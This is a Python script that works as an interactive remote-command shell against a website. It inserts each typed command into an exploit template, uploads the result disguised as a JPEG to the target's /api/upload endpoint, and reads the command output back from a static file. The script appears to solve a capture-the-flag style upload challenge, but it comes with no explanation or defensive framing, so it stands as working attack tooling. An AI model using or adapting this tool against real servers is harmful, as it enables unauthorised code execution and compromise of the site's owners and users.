import requests
import os
import sys

if len(sys.argv) <= 1:
    print(f'Usage: {sys.argv[0]} <url>')
    sys.exit()

REPLACE_STRING = '?'
EXPLOIT_TEMPLATE = 'exploit-template.txt'
TEMP_EXPLOIT_FILE = 'temp.jpg'
OUTPUT_FILE = 'static/petpets/a.txt'
WEBSITE_URL = sys.argv[1]

while True:
    cmd = input('$ ')
    print('Uploading..')
    exploit = open(EXPLOIT_TEMPLATE, 'r').read()
    exploit = exploit.replace(REPLACE_STRING, cmd)
    
    open(TEMP_EXPLOIT_FILE, 'w').write(exploit)
    files = {'file': open(TEMP_EXPLOIT_FILE, 'rb')}

    r = requests.post(f'{WEBSITE_URL}/api/upload', files=files)
    if r.status_code == 200:
        reply = requests.get(f'{WEBSITE_URL}/{OUTPUT_FILE}')
        print(reply.text)
    else:
        print('Something went wrong')
    os.remove(TEMP_EXPLOIT_FILE)